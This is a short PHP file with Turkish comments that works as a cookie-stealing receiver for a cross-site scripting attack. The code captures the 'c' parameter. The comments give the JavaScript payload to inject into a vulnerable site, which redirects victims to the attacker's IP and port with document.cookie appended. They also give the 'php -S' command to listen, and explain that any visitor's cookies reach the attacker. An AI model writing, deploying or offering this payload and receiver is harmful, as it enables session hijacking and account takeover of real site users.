<?php
        $cookie = $_GET["c"];
        /*

        xss açığı bulunan bir siteye aşağıdaki javascript kodunu yedirdiğimizi düşünelim
	#document.location = "http://ip_adresi:port/php_dosya_adi.php?c="+document.cookie

	# php -S ip_adresi:port
	Böyle yapıldığından php ile kendi ipmizin belirttiğimiz port numarasından bir dinleme yapıyoruz.

        bu php dosyasına ilgili sitedeki açıktan faydalanarak kullanıcıyı yönlendirdiğimizde
        kullanıcının tarayıcısında o an sayfada kayıtlı olan cookileri almış oluruz!


        Aslında olarak bulunduğumuz dizindeki bu php dosyasına xss açıklı yerden yönlendirme yapıyoruz.
        bu php dosyası da kendine gelen isteklerden get ile c olarak ayarlanan kısmı alıyor.
        c kısmını ise xss açıklı9 sitedeki document.cookie ile alıyoruz.
        dolayısıyla o sayfaya kim girmiş ise onun cookileri bize yönlendiriliyor.
        */
?>


